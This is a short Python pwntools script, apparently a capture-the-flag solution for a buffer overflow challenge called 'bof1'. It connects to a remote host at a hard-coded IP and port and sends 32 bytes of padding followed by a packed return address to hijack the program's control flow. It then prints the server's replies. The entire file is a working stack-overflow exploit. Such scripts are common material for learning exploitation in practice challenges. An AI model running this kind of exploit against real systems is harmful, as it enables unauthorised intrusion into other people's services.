from pwn import *

r = remote("45.77.245.244",5001)
# r = process("./bof1")
# gdb.attach(r)

payload = "a"*32 + p32(0x08048575)
r.sendline(payload)
print(r.recv())
print(r.recv())
